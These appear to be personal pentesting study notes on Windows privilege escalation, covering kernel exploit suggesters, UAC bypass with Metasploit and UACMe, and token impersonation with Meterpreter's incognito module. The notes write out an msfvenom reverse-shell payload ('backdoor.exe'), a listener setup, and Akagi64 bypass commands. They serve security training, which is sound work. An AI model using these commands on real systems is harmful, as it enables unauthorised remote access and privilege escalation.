## kernel exploits
![](</Images/Pasted image 20231204192850.png>)

Windows NT comes with all versions of Windows. Two main modes:
- User Mode
- Kernel Mode: unrestricted access to system

MANUAL METHOD
>Two tools:
>Windows-Exploit-Suggester
	- Found on github and finds exploits that are available
  Windows-Kernel-Exploits
	- Collection of exploits sorted by CVE number
	- Use after finding suggested exploits from above tool
	- use .exe file or compile own
	- upload with meterpreter and run

#Meterpreter can attempt to escalate privs via `getsystem`

#msfconsole auto method
>Once session is created use msfconsole `/post/multi/recon/local_exploit_suggester` this will list out different methods to try

## Bypassing UAC (User Access Control)

- Need to have access to user account with local admin group
- UAC can have various levels of integrity. If set lower than high programs can be executed without dialog box

### turning off UAC with metasploit
> meterpreter must be 64bit

To see group info, switch from meterpreter to shell
See users on machine: `net user`
See which users are in admin group: `net localgroup administrators`

To bypass UAC. Need session in background
Search `bypassuac_injection` many versions

### UACMe
- found on github https://github.com/hfiref0x/UACME
- Abuses inbuilt Windows AutoElevate tool

Windows commands for users
>net users list out users on system
>net localgroup administrators

>Upgrade #meterpreter from 32 to 64 by `pgrep explorer` and then `migrate` the process number

`getprivs` to show current privileges

>System error 5 shows dialog box error

Use akagi32 or akagi64. Use method 23 

> create payload with msfvenom
> `-p <payload ex. windows/meterpreter.reverse_tcp> LHOST and LPORT (listen) -f exe > backdoor.exe`

> then create listener with msfconsole
> `use multi/handler` 
> Set LHOST and LPORT the same as msfvemon

>using original meterpreter session upload file from msvemon and akagi64 to temp

> open shell system via `shell`

> reason why uloading two files. The backdoor file is the payload we want to run. In this case it's a listener with elevated privs. This won't run without Akagi64.exe as this is what bypasses UAC and grants admin processes

> final command goes `Akagi64.exe <method number> <msfvenom file>`

Can then list out any processes `ps` and migrate to process number and gain priv esc.

## Access Token

![](</Images/Pasted image 20231206184627.png>)

![](</Images/Pasted image 20231206184951.png>)

Meterpreter has built in tool called incognito. Need to have SeImpersonatePrivilege

1. need to get #meterpreter session first with #msfconsole
2. See if user access has correct token `getprivs`
3. `load incognito`
4. `list_tokens -u`
5. `impersonate_token <token name>`
6. `pgrep explorer`
7. `migrate <process>` needs to be Administrator etc
8. `get privs` this should be elevated now

If no tokens are available from 4 use "potato attack"

# Looking for privesc vectors

Automated tool: PrivescCheck found on [github](https://github.com/itm4n/PrivescCheck)
- needs to be transferred over to target
- look on github for use instructions

With credentials can use psexec.py to log onto SMB  via username@ip address
